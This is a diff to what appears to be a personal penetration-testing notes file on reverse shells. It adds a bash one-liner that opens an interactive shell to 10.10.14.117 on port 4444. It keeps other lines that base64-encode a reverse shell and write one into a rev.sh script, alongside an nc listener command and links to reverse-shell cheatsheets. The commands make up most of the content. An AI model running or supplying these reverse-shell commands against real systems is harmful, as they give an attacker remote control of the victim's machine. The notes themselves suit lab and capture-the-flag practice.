@@ -5,9 +5,10 @@
 https://www.revshells.com/
 #### Basic bash shell
 ```bash
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.117/4444 0>&1'
+
 echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
-```
-```bash
+
 echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
 ```
 ##### Upgrade shell to fully interactive:
@@ -27,7 +28,8 @@ Good shell
 ```
 rlwrap nc -lvnp
 ```
-[[nc]]
+#### [[metasploit]]
+
 #### Cheatsheet
 https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 
